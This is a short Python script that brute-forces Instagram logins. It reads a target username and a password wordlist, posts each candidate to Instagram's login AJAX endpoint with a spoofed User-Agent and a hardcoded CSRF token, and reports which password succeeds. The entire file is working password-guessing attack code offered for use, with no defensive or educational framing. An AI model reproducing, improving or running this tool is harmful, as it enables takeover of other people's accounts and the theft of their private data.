from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
CheckVersion = str(sys.version)
import re
from datetime import datetime

  
username=input("* Enter UserName > ")
password=input("* Enter FilePass > ")
passwords=open(password, 'r')
x2 = passwords.read().splitlines()
for x3 in x2:
  pwd = x3.split(':')[0]
  link = 'https://www.instagram.com/accounts/login/'
  login_url = 'https://www.instagram.com/accounts/login/ajax/'
  time = int(datetime.now().timestamp())
  payload = {
	'username': username,
	'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
    'queryParams': {},
    'optIntoOneTap': 'false'
    }
  with requests.Session() as s:
    s.cookies.update({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
    r = s.get(link)
    csrf = (f'RfHhdIkMZUmagherNsVXQWnYCeOtqjSI')

    r = s.post(login_url, data=payload, headers={
      "User-Agent": "BrightSign/8.0.69 (XT1143)Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.11.2 Chrome/65.0.3325.230 Safari/537.36",
      "X-Requested-With": "XMLHttpRequest",
      "Referer": "https://www.instagram.com/accounts/login/",
      "x-csrftoken":csrf
      
    })
    if 'authenticated": true' in r.text:
      print("--------------")
      print(f"* UserName > {username}")
      print(f"* Passowrd > {pwd}")
      print(f"* status_s > {r}")
      print(f"* Login_In > ( Succeeded )")
    else:
      print("--------------")
      print(f"* UserName > {username}")
      print(f"* Passowrd > {pwd}")
      print(f"* status_s > {r}")
      print(f"* Login_In > ( Falid )")
      